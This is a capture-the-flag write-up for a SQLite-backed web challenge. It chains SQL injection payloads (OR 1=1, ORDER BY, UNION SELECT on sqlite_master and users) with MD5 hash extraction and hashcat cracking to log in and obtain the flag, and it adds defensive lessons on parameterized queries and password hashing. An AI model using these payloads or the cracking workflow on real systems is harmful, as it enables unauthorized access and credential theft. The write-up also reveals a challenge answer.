# SQL Map1 — CyLab Academy

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Platform:** CyLab Security Academy / picoCTF 2026  
**Vulnerabilities:** SQL Injection, Weak Password Hashing  
**Database:** SQLite  
**Hashing Algorithm:** MD5  
**Tools:** Browser DevTools, curl/browser, Hashcat, RockYou

---

## 1. Challenge Description

The challenge presents a web application called:

> **Vulnerable Flag Search**

The description mentioned:

- sloppy code
- legacy hashing practices
- acting as a legitimate user
- retrieving a secret flag

These clues suggested that the challenge would probably involve **more than one vulnerability**.

The eventual attack chain was:

```text
Web Application
      │
      ▼
Search parameter `q`
      │
      ▼
SQL Injection
      │
      ▼
SQLite database
      │
      ├── flags table
      │
      └── users table
             │
             ▼
       Password hashes
             │
             ▼
        MD5 identified
             │
             ▼
          Hashcat
             │
             ▼
     ctf-player:dyesebel
             │
             ▼
       Legitimate login
             │
             ▼
       Protected area
             │
             ▼
            FLAG
```

---

# 2. Reconnaissance

After creating an account, the application provided a search function.

The form looked approximately like:

```html
<form method="GET" action="vuln.php">
    <input type="text" name="q">
    <input type="hidden" name="PHPSESSID" value="...">
    <button type="submit">Search</button>
</form>
```

The interesting parameter was:

```text
q
```

A normal request looked like:

```http
GET /vuln.php?q=pico&PHPSESSID=...
```

Searching for:

```text
pico
```

returned:

```text
No flags matched your search.
```

At this point, the important question was:

> **How is `q` being processed by the backend?**

---

# 3. Testing for SQL Injection

## 3.1 Single quote test

I entered:

```text
'
```

The server responded with:

```text
SQLite3::query(): Unable to prepare statement:
1, incomplete input
```

followed by:

```text
Call to a member function fetchArray() on bool
```

### Why this was important

The error exposed:

```text
SQLite3::query()
```

This tells us the application is using **SQLite**.

It also strongly suggests that our input is being inserted into an SQL statement without proper escaping or parameterization.

### Learning: Error-based reconnaissance

Application errors can reveal useful technical information:

```text
Database engine
Programming language
Library/framework
File paths
SQL syntax
Application logic
```

For example:

```text
/var/www/html/vuln.php
```

revealed the server-side PHP file location.

### Defensive lesson

Production applications should not expose raw database errors to users.

Instead of:

```text
SQLite3::query(): Unable to prepare statement
```

the user should receive something generic such as:

```text
An unexpected error occurred.
```

Detailed errors should go to server-side logs.

---

# 4. Boolean SQL Injection

I then tested:

```sql
' OR 1=1 -- 
```

The application returned many records.

This confirmed that the input could modify the SQL query.

---

## Why does `' OR 1=1 --` work?

Consider a vulnerable query:

```sql
SELECT key, value
FROM flags
WHERE key LIKE '%USER_INPUT%';
```

If the user enters:

```text
' OR 1=1 -- 
```

the resulting query can become conceptually:

```sql
SELECT key, value
FROM flags
WHERE key LIKE '%' OR 1=1 -- %';
```

The important parts are:

### `'`

Closes the string that the application originally opened.

### `OR 1=1`

Creates a condition that is always true.

```sql
1=1
```

is always true.

### `--`

Starts an SQL comment in SQLite.

Everything after it is ignored.

---

# 5. Understanding the SQL Injection

This is the fundamental mistake:

### Vulnerable approach

```php
$query = "SELECT key,value FROM flags WHERE key LIKE '%" . $_GET['q'] . "%'";
```

User input becomes part of the SQL syntax.

Therefore:

```text
SQL code + user input
```

are mixed together.

---

## Secure approach

The application should use **prepared statements / parameterized queries**.

Conceptually:

```php
$stmt = $db->prepare(
    "SELECT key,value FROM flags WHERE key LIKE :q"
);

$stmt->bindValue(':q', '%' . $_GET['q'] . '%');
```

Now the user's input is treated as **data**, rather than SQL code.

---

# 6. Determining the Number of Columns

To perform a `UNION SELECT`, we need to know how many columns the original query returns.

I tested:

```sql
' ORDER BY 1-- 
```

Then:

```sql
' ORDER BY 2-- 
```

Both worked.

Next:

```sql
' ORDER BY 3-- 
```

produced:

```text
1st ORDER BY term out of range -
should be between 1 and 2
```

Therefore:

```text
Original query = 2 columns
```

---

## Learning: `ORDER BY` enumeration

We can determine the column count by incrementing:

```text
ORDER BY 1
ORDER BY 2
ORDER BY 3
ORDER BY 4
...
```

When the query fails:

```text
Highest working number = column count
```

In this challenge:

```text
ORDER BY 1 → ✓
ORDER BY 2 → ✓
ORDER BY 3 → ✗

Therefore:

2 columns
```

---

# 7. UNION SELECT

Now that we know the query has two columns, we can construct a two-column `UNION`.

The basic concept is:

```sql
SELECT column1,column2
UNION
SELECT attacker_column1,attacker_column2
```

The two queries must have compatible numbers of columns.

Our vulnerable query therefore allowed us to append another two-column query.

---

# 8. SQLite Database Enumeration

SQLite stores database metadata in:

```text
sqlite_master
```

We queried it using:

```sql
' UNION SELECT name,sql
FROM sqlite_master
WHERE type='table'-- 
```

The database revealed:

```text
flags
CREATE TABLE flags (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key TEXT NOT NULL UNIQUE,
    value TEXT NOT NULL
)
```

and:

```text
users
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
)
```

We also saw:

```text
sqlite_sequence
```

---

# 9. Understanding `sqlite_master`

This is an important SQLite concept.

SQLite keeps information about database objects in:

```text
sqlite_master
```

It can contain information about:

- tables
- indexes
- views
- triggers

The `sql` column can contain the SQL used to create the object.

For example:

```sql
SELECT name, sql
FROM sqlite_master
WHERE type='table';
```

This is essentially asking:

> "Show me the names and definitions of the tables in this SQLite database."

---

# 10. Database Structure

Our discovered database looked like:

```text
Database
│
├── flags
│   ├── id
│   ├── key
│   └── value
│
├── users
│   ├── id
│   ├── username
│   └── password
│
└── sqlite_sequence
```

The `users` table was particularly interesting because the challenge description mentioned:

> legacy hashing practices

That suggested the password hashes might be weak.

---

# 11. Extracting Password Hashes

Because we knew the query had two columns, we queried:

```sql
' UNION SELECT username,password
FROM users-- 
```

This revealed:

```text
admin       5a9a79d9fa477ed163b89088681672c9
ctf-player  7a67ab5872843b22b5e14511867c4e43
ghost       8d2379c40704bed972e55680be2355e2
malicious   a669d60c31ad3d05b9e453c8576c7aab
noaccess    83806b490e28a7f8e6662646cbdbff1a
suspicious  eb1f3ba6901c65d9b2e09a38f560758b
```

The interesting target was:

```text
Username:
ctf-player

Hash:
7a67ab5872843b22b5e14511867c4e43
```

---

# 12. What Is a Password Hash?

A password should not normally be stored as plaintext.

Instead:

```text
Password
   │
   ▼
Hash function
   │
   ▼
Hash
```

For example:

```text
abc
 ↓
MD5
 ↓
900150983cd24fb0d6963f7d28e17f72
```

When the user logs in, the server hashes the supplied password again:

```text
Entered password
       ↓
      MD5
       ↓
Generated hash
       ↓
Compare with stored hash
```

If they match:

```text
Login successful
```

---

# 13. Identifying MD5

The hashes looked like:

```text
7a67ab5872843b22b5e14511867c4e43
```

Characteristics:

```text
32 characters
0-9
a-f
```

This is consistent with MD5.

However, **hash length alone is not enough to prove the algorithm**.

A proper investigation can use:

```bash
hashid '7a67ab5872843b22b5e14511867c4e43'
```

and also investigate:

- application source code
- challenge description
- database implementation
- known plaintext/hash pairs
- hash format/prefixes

### Important lesson

Don't automatically think:

```text
32 hex characters = definitely MD5
```

Instead:

```text
Format
  +
Application clues
  +
Source code
  +
Known hashes
  =
Confidence in algorithm
```

---

# 14. Verifying MD5

We knew that our test account used:

```text
abc
```

We could verify its MD5 using Python:

```python
import hashlib

print(hashlib.md5(b"abc").hexdigest())
```

Output:

```text
900150983cd24fb0d6963f7d28e17f72
```

This matched the hash found in the database.

Therefore we had strong evidence that the application was using:

```text
MD5
```

for passwords.

---

# 15. Hashcat

We created a file containing the target hash:

```bash
echo '7a67ab5872843b22b5e14511867c4e43' > hash.txt
```

Then:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Breaking down the command

```bash
hashcat
```

Launch Hashcat.

```text
-m
```

Select the hash mode.

```text
0
```

Hashcat mode `0` = MD5.

```text
hash.txt
```

Contains our target hash.

```text
/usr/share/wordlists/rockyou.txt
```

Contains candidate passwords.

So the command means:

> "Use Hashcat's MD5 mode and try every password in RockYou against the hash in `hash.txt`."

---

# 16. Hashcat Result

Hashcat successfully recovered:

```text
7a67ab5872843b22b5e14511867c4e43:dyesebel
```

Therefore:

```text
Username: ctf-player
Password: dyesebel
```

---

# 17. Why Hashcat Can Crack MD5

Hashcat isn't "decrypting" MD5.

Instead, it performs:

```text
Candidate password
       ↓
      MD5
       ↓
Candidate hash
       ↓
Compare
       │
       ├── Different → Try next password
       │
       └── Same → Password found
```

For example:

```text
dyesebel
    ↓
MD5("dyesebel")
    ↓
7a67ab5872843b22b5e14511867c4e43
```

Therefore the candidate is correct.

---

# 18. Why MD5 Is Bad for Password Storage

MD5 is a **fast general-purpose hash function**.

That is exactly what makes it unsuitable for password storage.

An attacker can calculate enormous numbers of guesses very quickly.

Modern password storage should use a deliberately expensive password-hashing algorithm such as:

```text
Argon2id
bcrypt
scrypt
PBKDF2
```

with an appropriate salt and parameters.

### Important distinction

Hashing ≠ encryption.

| Hashing | Encryption |
|---|---|
| One-way | Reversible with a key |
| Designed for integrity/password verification | Designed to protect recoverable data |
| No decryption | Can decrypt |
| MD5 is a hash | AES is encryption |

---

# 19. Logging in as `ctf-player`

Using:

```text
Username: ctf-player
Password: dyesebel
```

we logged into the application as a legitimate user.

This was an important part of the challenge.

The SQL injection wasn't necessarily the final objective.

Instead:

```text
SQLi
 ↓
Database access
 ↓
Credential extraction
 ↓
Password cracking
 ↓
Legitimate authentication
```

The challenge description's phrase:

> **"act as a legit user"**

was therefore an important clue.

---

# 20. Protected Area

After logging in as:

```text
ctf-player
```

we reached:

```text
Protected area
```

The application displayed the challenge flag.

```text
academy{f0uNd_s3cr3T_k3y_f0r_w3_<~}
```

> **Flag:** `academy{f0uNd_s3cr3T_k3y_f0r_w3_<~}`

---

# 21. Complete Attack Chain

```text
                 RECON
                   │
                   ▼
             Search feature
                   │
                   ▼
              q parameter
                   │
                   ▼
           Single quote test
                   │
                   ▼
          SQLite error revealed
                   │
                   ▼
            SQL Injection
                   │
                   ▼
             ORDER BY
                   │
                   ▼
             2 columns
                   │
                   ▼
            UNION SELECT
                   │
                   ▼
           sqlite_master
                   │
                   ▼
            users table
                   │
                   ▼
         Username + password hash
                   │
                   ▼
              MD5 identified
                   │
                   ▼
               Hashcat
                   │
                   ▼
       ctf-player : dyesebel
                   │
                   ▼
             Legitimate login
                   │
                   ▼
            Protected area
                   │
                   ▼
                  FLAG
```

---

# 22. Key Learning Points

## SQL Injection

The most important lesson:

> **Never concatenate untrusted input directly into SQL queries.**

Bad:

```php
$query = "SELECT * FROM users WHERE username = '" . $username . "'";
```

Good:

```php
$stmt = $db->prepare(
    "SELECT * FROM users WHERE username = :username"
);
$stmt->bindValue(':username', $username);
```

---

## SQLite Enumeration

Remember:

```text
sqlite_master
```

is extremely useful when investigating SQLite databases.

Basic concept:

```sql
SELECT name,sql
FROM sqlite_master
WHERE type='table';
```

---

## UNION SQL Injection

For a UNION injection:

```text
Number of columns must match.
```

If the original query has:

```text
2 columns
```

your UNION must also return:

```text
2 columns
```

---

## Hash Identification

Don't blindly assume the algorithm.

Use:

```bash
hashid '<hash>'
```

and investigate the application.

Remember:

```text
32 hex characters
```

can suggest MD5, but **suggestion ≠ proof**.

---

## Hashcat

The basic workflow is:

```text
Find hash
   ↓
Identify algorithm
   ↓
Find Hashcat mode
   ↓
Choose attack strategy
   ↓
Run Hashcat
   ↓
Verify recovered password
```

For MD5:

```bash
hashcat -m 0 hash.txt rockyou.txt
```

---

# 23. What Would a Developer Do to Prevent This?

### SQL Injection

Use:

```text
Prepared statements
Parameterized queries
Input validation
Least-privilege database accounts
```

Never:

```text
"SELECT ... " + user_input
```

---

### Password Security

Never store:

```text
MD5(password)
```

Instead use:

```text
Argon2id
bcrypt
scrypt
PBKDF2
```

with unique salts.

---

### Error Handling

Don't expose:

```text
SQLite3::query()
/var/www/html/vuln.php
line 39
```

to users.

Log detailed errors internally and return generic errors externally.

---

### Database Permissions

The web application should have only the database privileges it actually needs.

If possible, the search functionality should not be able to access sensitive credential tables.

---

# 24. Tools Learned

| Tool/Technique | Purpose |
|---|---|
| Browser DevTools | Inspect requests/source |
| SQL Injection | Manipulate database queries |
| `ORDER BY` | Determine column count |
| `UNION SELECT` | Extract arbitrary query results |
| `sqlite_master` | Enumerate SQLite schema |
| `hashid` | Identify possible hash algorithms |
| Python `hashlib` | Verify hashes |
| Hashcat | Recover passwords from hashes |
| RockYou | Password candidate wordlist |

---

# 25. Things I Should Remember for Future CTFs

### When I see a search box:

```text
Test whether the parameter is injectable.
```

### When I get a database error:

```text
Read the error carefully.
```

It may reveal the DBMS.

### When SQLi works:

```text
Find column count
        ↓
Identify DBMS
        ↓
Enumerate schema
        ↓
Identify interesting tables
        ↓
Extract useful data
```

### When I find a password hash:

```text
Don't immediately run Hashcat.
        ↓
Identify the hashing algorithm first.
```

### When the challenge mentions:

> weak/legacy hashing

Think:

```text
MD5
SHA-1
weak password
dictionary attack
Hashcat
```

### When the challenge says:

> act as a legitimate user

Think:

```text
Can I obtain valid credentials?
Can I recover a password hash?
Is there an authentication bypass?
```

---

# 26. Final Takeaway

This challenge was really **three lessons combined into one**:

```text
                 SQL INJECTION
                       │
             "Can I access the DB?"
                       │
                       ▼
               DATABASE ENUMERATION
                       │
            "What's stored in it?"
                       │
                       ▼
             WEAK PASSWORD HASHING
                       │
          "Can I recover the password?"
                       │
                       ▼
              LEGITIMATE ACCESS
                       │
                       ▼
                     FLAG
```

The most valuable part wasn't the final flag. It was learning how a relatively small mistake—**unsafely handling one search parameter**—could lead from a simple search feature to database enumeration, credential exposure, password recovery, and authenticated access.
